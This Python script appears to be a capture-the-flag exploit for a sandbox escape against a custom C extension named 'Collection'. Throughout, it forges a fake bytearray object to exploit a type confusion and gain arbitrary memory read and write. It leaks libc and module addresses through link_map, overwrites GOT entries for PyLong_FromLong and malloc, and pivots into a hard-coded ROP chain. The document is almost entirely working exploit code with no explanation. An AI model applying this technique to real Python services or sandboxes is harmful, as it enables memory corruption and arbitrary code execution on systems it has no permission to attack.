from sys import modules
del modules['os']
import Collection
keys = list(__builtins__.__dict__.keys())
for k in keys:
    if k != 'id' and k != 'hex' and k != 'print' and k != 'range':
        del __builtins__.__dict__[k]

def sleep():
	k = 0
	while k<40000000:
		k+=1

chset = ["\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"]

def chr(x):
	return chset[x]

def ord(x):
	for i in range(256):
		if chset[i] == x:
			return i

def p64(x):
	t = x
	out = ""
	for i in range(8):
		out += chr(t&0xFF)
		t = t >> 8
	return out

def u64(x):
	out = 0
	for i in range(8):
		out += x[i]<<(i*8)
	return out

"""
fakestruct:
struct PyByteArrayObject {
    int64_t ob_refcnt;   /* can be basically any value we want */
    struct _typeobject *ob_type; /* points to the bytearray type object */
    int64_t ob_size;     /* Number of items in variable part */
    int64_t ob_alloc;    /* How many bytes allocated in ob_bytes */
    char *ob_bytes;      /* Physical backing buffer */
    char *ob_start;      /* Logical start inside ob_bytes */
    int32_t ob_exports;  /* Not exactly sure what this does, we can ignore it */
}
"""
def arbitrary_read(addr,start,end):
	fakestruct = p64(0xff)+p64(0x9ce7e0)+p64(0x200)+p64(0x201)+p64(addr)*2
	structaddr = id(fakestruct) + 0x48
	#print("[*] target: 0x%x"%addr)
	c1 = Collection.Collection({"a":[],"a\x00":structaddr})
	c2 = Collection.Collection({"a":structaddr,"a\x00":[]})#INT->LIST
	x = c2.get("a")#GET ARBITRARY ADDRESS AS AN OBJECT
	return x[start:end]

def getstr(addr):
	i = 0
	out = ""
	ch = ""
	while ch != "\x00":
		ch = chr(arbitrary_read(addr,i,i+1)[0])
		out += ch
		i+=1
	return out

def arbitrary_write(addr,start,end,arr):
	fakestruct = p64(0xff)+p64(0x9ce7e0)+p64(0x200)+p64(0x201)+p64(addr)*2
	structaddr = id(fakestruct) + 0x48
	#print("[*] target: 0x%x"%addr)
	c1 = Collection.Collection({"a":[],"a\x00":structaddr})
	c2 = Collection.Collection({"a":structaddr,"a\x00":[]})#INT->LIST
	x = c2.get("a")#GET ARBITRARY ADDRESS AS AN OBJECT
	x[start:end] = arr
	return x

sys = modules['sys']
os = modules['os.path'].os

for x in ().__class__.__base__.__subclasses__():
	if x.__name__ == 'bytearray':
		bytearray = x
		break

free_got = 0x9B3518 
sem_post_got = 0x9B3A28
strlen_got = 0x9B3540
free_offset = 620880
'''
0x00000000004a1bd1 : push rax ; call 0x4ee603
'''
push_rax = 0x4a1bd1
leave_ret = 0x467123
ret = 0x400291
link_map = u64(arbitrary_read(0x9B3008,0,8))
LIBC = u64(arbitrary_read(free_got,0,8)) - free_offset
#use arbitrary read to find link_map struct and find all offsets

print("[+] LIBC: 0x%x"%LIBC)
print("[+] link_map: 0x%x"%link_map)

cur = link_map
i = 0
found = False
libname = "Collection.cpython-36m-x86_64-linux-gnu.so"
while True:
	name = getstr(u64(arbitrary_read(cur,8,16)))
	if libname in name:
		CLIB = u64(arbitrary_read(cur,0,8))
		print("[+] %s found by searching link_map, base is 0x%x"%(libname,CLIB))
		found = True
		break
	cur = u64(arbitrary_read(cur,0x8*3,8*4))

if not found:
	print("[-] lib not found.")
	sys.exit(-1)

pylong_fromlong_got = CLIB + 0x204040
malloc_got = CLIB + 0x204078

ROP = "\x12\x16B\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x0e\x11B\x00\x00\x00\x00\x00\x00\xff@\x00\x00\x00\x00\x00\xc1&@\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xb0\x08B\x00\x00\x00\x00\x00\x12\x16B\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x0e\x11B\x00\x00\x00\x00\x00\x80\xe9\x9c\x00\x00\x00\x00\x00\xc1&@\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\xe0\x07B\x00\x00\x00\x00\x00"*200
pivot_heap_addr = id(ROP) + 0x8*8
print("[+] pivot stack: 0x%x"%pivot_heap_addr)
c = Collection.Collection({"abcd":pivot_heap_addr})

pppp = [ord(x) for x in p64(0x1DB2 + CLIB)]
atk = arbitrary_write(pylong_fromlong_got,0,8,pppp)

pppp = [ord(x) for x in p64(leave_ret)]
offset = malloc_got-pylong_fromlong_got
atk[offset:offset+8] = pppp #overwite malloc_got as well

c.get("abcd")#trigger ROP


